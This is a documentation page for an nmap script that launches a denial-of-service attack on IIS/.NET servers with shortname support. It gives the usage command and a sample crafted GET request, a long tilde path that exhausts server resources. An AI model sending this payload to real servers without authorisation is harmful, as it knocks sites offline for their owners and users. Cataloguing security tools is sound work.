---
title: "http-iis-shortname-dos"
source: unofficial
category: "Dos"
categories:
  - "dos"
shortDescription: "http-iis-shortname-dos launches a Denial of Service attack that exploits a vulnerability in IIS/.NET installations with shortname support enabled."
risk: intrusive
tags:
  - "dos"
  - "cldrn/nmap-nse-scripts"
scriptTypes: []
protocols: []
ports: []
usage: "nmap -p80,443 --script http-iis-shortname-dos <target>"
outputPreview:
  - "No output"
author: "Paulino <calderon@websec.mx> (upstream: cldrn/nmap-nse-scripts)"
reference:
  label: "View Upstream Script Source"
  url: "https://github.com/cldrn/nmap-nse-scripts/blob/master/scripts/http-iis-shortname-dos.nse"
---

Imported from the upstream repository [cldrn/nmap-nse-scripts](https://github.com/cldrn/nmap-nse-scripts).
http-iis-shortname-dos launches a Denial of Service attack that exploits a vulnerability in IIS/.NET installations with shortname support enabled.
This script sends specially crafted requests to cause the target to make numerous file system calls and run out of resources. A request looks like this:
GET /190~0/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/
    ~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/nMaP~.AsPx?aspxerrorpath=/ HTTP/1.1
* Tested on .NET 4 with IIS 7
References:
* http://soroush.secproject.com/downloadable/iis_tilde_dos.txt
* http://support.microsoft.com/kb/142982/en-us
Todo:
* Add monitoring check to see if target got DoSed and report properly.
